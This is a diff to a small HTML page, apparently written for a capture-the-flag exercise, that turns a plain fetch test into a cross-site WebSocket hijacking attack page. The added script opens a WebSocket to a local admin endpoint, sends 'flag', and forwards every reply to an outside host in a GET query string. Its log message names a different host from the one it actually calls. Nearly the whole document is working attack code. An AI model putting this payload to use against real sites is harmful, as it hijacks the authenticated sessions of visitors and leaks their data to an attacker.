@@ -1,19 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fetch Example</title>
+    <title>Cross-site WebSocket Hijacking</title>
 </head>
 <body>
     <script>
-        // Perform a GET request to the specified URL
-        fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/', {
-            method: 'GET'
-        }).then(response => {
-            console.log('Request sent successfully.');
-        }).catch(error => {
-            console.error('Error sending request:', error);
-        });
+        // Create a new WebSocket object pointing to the target endpoint
+        var webSocket = new WebSocket('wss://127.0.0.1:8080/admin/ws');
+        
+        webSocket.onopen = function() {
+            // Send "flag" message when the WebSocket connection is established
+            webSocket.send("flag");
+        };
+        
+        webSocket.onmessage = function(event) {
+            // Extract data from the WebSocket message
+            var extractedData = event.data;
+
+            // Send the extracted data to your site using a GET request
+            fetch('https://mehtix.fhiran.com/flag?myflag=' + encodeURIComponent(extractedData), {
+                method: 'GET'
+            }).then(response => {
+                console.log('Data sent to https://mysite.com/flag successfully.');
+            }).catch(error => {
+                console.error('Error sending data:', error);
+            });
+        };
     </script>
-    <p>Fetching data... Check the server logs.</p>
+    <p>Fetching WebSocket data...</p>
 </body>
 </html>
